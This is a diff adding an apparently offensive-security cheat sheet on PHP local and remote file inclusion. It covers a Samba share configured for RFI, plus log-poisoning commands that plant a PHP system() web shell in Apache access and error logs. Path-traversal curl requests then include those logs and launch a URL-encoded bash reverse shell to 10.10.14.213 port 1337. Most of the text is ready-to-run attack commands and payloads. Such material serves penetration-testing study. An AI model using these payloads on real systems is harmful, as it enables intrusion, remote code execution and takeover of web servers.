@@ -1,0 +1,63 @@
+## LFI/RFI
+
+
+
+### PHP RFI with SMB
+
+`/etc/samba/smb.conf`:
+
+```
+log level = 3
+[share]
+        comment = TEMP
+        path = /tmp/smb
+        writable = no
+        guest ok = yes
+        guest only = yes
+        read only = yes
+        browsable = yes
+        directory mode = 0555
+        force user = nobody
+```
+
+```
+root@kali:$ chmod 0555 /tmp/smb
+root@kali:$ chown -R nobody:nogroup /tmp/smb
+root@kali:$ service smbd restart
+root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
+```
+
+* [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+
+
+
+### Log Poisoning
+
+
+#### PHP
+
+Access log (needs single `'` instead of double `"`):
+
+```
+root@kali:$ nc 127.0.0.1 80
+GET /<?php system($_GET['cmd']); ?>
+
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+Or
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+```
+
+Error log:
+
+```
+root@kali:$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+Or
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+```
+
+* [medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
+* [outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
+
+
+
